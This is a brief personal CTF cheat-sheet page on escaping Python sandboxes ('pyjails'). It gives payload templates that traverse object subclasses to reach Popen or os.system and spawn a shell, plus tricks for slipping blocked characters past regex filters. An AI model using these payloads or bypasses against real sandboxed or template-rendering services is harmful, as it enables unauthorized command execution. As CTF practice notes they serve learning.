# JAIL\_ESCAPE

[BACK](https://github.com/MassinissaDjellouli/CTFStuff/blob/master/README.md)

## Jail Escape

### Python

* https://shirajuki.js.org/blog/pyjail-cheatsheet/
* Quick templates:
  * ().**class**.**bases**\[0].**subclasses**()\[INDEX\_OF\_POPEN]\(\["/bin/cat","flag"], stdout=-1).communicate()
  * ().**class**.**bases**\[0].**subclasses**()\[INDEX\_OF\_os.\_wrap\_close].**init**.**globals**\['sys'].modules\['os'].system('sh')

#### Filters bypass

* Try using unicode chars instead of the ascii ones.
* Can also try a "blind" exec with error messages giving us info
* if there is a regex to filter that replaces invalid chars with nothing:
  * ex: regex blocks \_\_ and \{{
  * if we want to write \{{, we can write {\_\_{
    * regex replaces \_\_ with nothing and return \{{
